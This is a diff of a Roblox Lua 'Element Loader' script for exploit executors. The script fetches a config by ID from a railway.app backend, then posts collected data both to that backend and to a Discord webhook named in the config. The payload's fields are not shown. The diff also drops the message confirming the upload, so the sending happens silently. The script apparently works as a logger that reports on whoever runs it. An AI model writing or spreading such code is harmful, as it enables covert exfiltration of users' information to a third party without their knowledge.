@@ -1,24 +1,18 @@
--- ✅ Element Loader (compatibil cu mai mulți executori)
+-- Element Loader (Universal)
 -- ⚠️ Don't share this script ⚠️
 
 if not ID then
-    error("⚠️ Missing ID in script!")
+    error("Missing ID in script!")
 end
 
 local HttpService = game:GetService("HttpService")
 
--- Universal request function
-local function send_request(options)
-    if http_request then
-        return http_request(options)
-    elseif request then
-        return request(options)
-    else
-        error("❌ Executorul tău nu suportă http_request sau request!")
-    end
+-- Universal request (works for Synapse, Delta, Script-Ware, etc.)
+local request = (syn and syn.request) or http_request or request or (http and http.request)
+if not request then
+    error("Your executor does not support HTTP requests.")
 end
 
--- Get user config
 local configUrl = "https://element.up.railway.app/api/config?id=" .. ID
 local response = game:HttpGet(configUrl)
 
@@ -38,7 +32,7 @@ if success and config.webhook then
     }
 
     -- Report to backend
-    send_request({
+    request({
         Url = "https://element.up.railway.app/report",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
@@ -46,14 +40,12 @@ if success and config.webhook then
     })
 
     -- Send also to Discord webhook
-    send_request({
+    request({
         Url = config.webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(data)
     })
-
-    print("[Element] ✅ Data sent successfully")
 else
-    warn("⚠️ Config not found for ID: " .. ID)
+    warn("Config not found or invalid for ID: " .. ID)
 end
